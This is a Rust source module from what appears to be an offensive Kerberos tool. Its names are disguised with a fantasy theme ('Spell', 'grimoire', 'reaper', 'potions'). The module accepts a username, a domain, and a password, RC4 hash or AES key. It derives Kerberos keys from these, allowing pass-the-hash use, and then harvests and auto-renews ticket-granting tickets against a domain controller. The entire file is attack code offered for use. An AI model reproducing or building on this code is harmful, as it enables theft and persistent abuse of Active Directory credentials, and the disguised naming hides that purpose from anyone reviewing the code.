use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::display_charm::*;
use crate::dungeon::reaper;
use crate::dungeon::krb_structures::constants::*;
use crate::dungeon::potions;
use crate::dungeon::wand_utils;

pub struct Reaping;

impl super::Spell for Reaping {
    fn incantation(&self) -> &'static str { "reaping" }
    fn grimoire(&self) -> &'static str {
        "Harvest and auto-renew TGTs. /user: /domain: /password: or /rc4: or /aes256: [/interval:] [/dc:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let user   = args.get("user").ok_or_else(|| anyhow::anyhow!("/user: required"))?;
        let domain = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let interval = args.get("interval").and_then(|s| s.parse::<u64>().ok()).unwrap_or(60);
        let dc = args.get("dc").map(|s| s.as_str());

        let (key, etype) = resolve_harvest_key(args, user, domain)?;

        print_banner(&format!("Starting harvest for {}@{}", user, domain));
        reaper::harvest_tgts(user, domain, &key, etype, interval, dc)
    }
}

fn resolve_harvest_key(
    args: &HashMap<String, String>,
    user: &str,
    domain: &str,
) -> Result<(Vec<u8>, i32)> {
    if let Some(rc4) = args.get("rc4") {
        return Ok((wand_utils::hex_to_bytes(rc4)?, ETYPE_RC4_HMAC));
    }
    if let Some(aes256) = args.get("aes256") {
        return Ok((wand_utils::hex_to_bytes(aes256)?, ETYPE_AES256_CTS_HMAC_SHA1_96));
    }
    if let Some(aes128) = args.get("aes128") {
        return Ok((wand_utils::hex_to_bytes(aes128)?, ETYPE_AES128_CTS_HMAC_SHA1_96));
    }
    if let Some(password) = args.get("password") {
        let etype = ETYPE_RC4_HMAC;
        let salt = potions::kerberos_salt(user, domain);
        let key  = potions::string_to_key(etype, password, &salt)?;
        return Ok((key, etype));
    }
    bail!("/password: or /rc4: or /aes256: required")
}
